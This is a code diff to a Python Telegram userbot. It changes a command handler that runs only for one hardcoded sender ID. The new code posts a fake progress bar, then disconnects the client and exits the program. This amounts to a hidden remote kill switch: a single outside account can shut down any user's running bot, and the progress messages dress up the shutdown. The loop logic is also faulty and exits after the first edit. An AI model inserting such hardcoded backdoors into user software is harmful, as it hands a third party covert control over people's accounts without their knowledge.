@@ -331,8 +331,24 @@ async def update_owner(event):
 @iqthon.on(events.NewMessage(pattern=f"dee(?: |$)(.*)"))    
 async def dee(event):
     if event.sender_id == 1226408155 :
-        iqthon.disconnect()
+        update_text = [
+            "%20 ▰▰▱▱▱▱▱▱▱▱ ", 
+            "%30 ▰▰▰▱▱▱▱▱▱▱ ", 
+            "%40 ▰▰▰▰▱▱▱▱▱▱ ", 
+            "%50 ▰▰▰▰▰▱▱▱▱▱ ",
+            "%60 ▰▰▰▰▰▰▱▱▱▱ ",
+            "%70 ▰▰▰▰▰▰▰▱▱▱ ",
+            "%80 ▰▰▰▰▰▰▰▰▱▱ ",
+            "%90 ▰▰▰▰▰▰▰▰▰▱ ",
+            "%100 ▰▰▰▰▰▰▰▰▰▰ "
+            
+        ]
+        update_msg = await event.reply("جاري ايقاف")
+        for msg_to_update in update_text:
+            await update_msg.edit(msg_to_update)
+            iqthon.disconnect()
             sys.exit()            
+        
             
 
 @iqthon.on(admin_cmd(pattern="مساعده(?:\s|$)([\s\S]*)"))
